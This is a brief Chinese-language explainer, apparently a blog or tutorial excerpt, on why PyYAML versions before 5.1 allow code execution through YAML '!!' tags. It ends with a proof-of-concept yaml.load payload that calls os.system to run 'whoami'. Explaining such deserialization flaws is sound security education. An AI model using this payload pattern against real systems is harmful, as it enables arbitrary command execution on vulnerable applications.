漏洞成因

由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 !! 来扩展额外的解析能力。

在python的 PyYAML中

yaml < 5.1

import yaml

yaml.load('exp: !!python/object/apply:os.system ["whoami"]')
